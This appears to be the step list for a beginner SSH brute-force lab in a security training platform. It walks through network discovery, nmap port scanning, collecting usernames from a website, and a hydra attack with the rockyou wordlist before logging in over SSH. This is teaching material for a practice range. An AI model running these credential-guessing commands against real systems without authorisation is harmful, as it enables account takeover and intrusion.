# Lab 02 — SSH Brute Force
**File:** `src/laboratorios/laboratorio02.ts`
**Date:** 2026-04-02
**Difficulty:** Easy
**Category:** Web
**Network Range:** 10.10.10.0/24
**Target:** 10.10.10.11

---

## Steps

### 01 — Network Reconnaissance
**Text:** Discover the hosts on the network
**Hint 1 (tool):** Use arp-scan
**Hint 2 (command):** `arp-scan 10.10.10.0/24`

### 02 — Port Scanning
**Text:** Identify the services running on the target
**Hint 1 (tool):** Use nmap
**Hint 2 (command):** `nmap -sV <target-ip>`

### 03 — Web Reconnaissance
**Text:** Access the website to identify employees and possible usernames
**Hint 1 (tool):** Use the Firefox browser
**Hint 2 (command):** Click the Firefox button

### 04 — SSH Brute Force
**Text:** Perform a brute force attack to get the SSH credentials
**Hint 1 (tool):** Use hydra for brute force
**Hint 2 (command):** `hydra -l <username> -P /usr/share/wordlists/rockyou.txt <target-ip> ssh`

### 05 — SSH Access
**Text:** Connect via SSH using the found credentials
**Hint 1 (tool):** Use the ssh command
**Hint 2 (command):** `ssh <username>@<target-ip>`
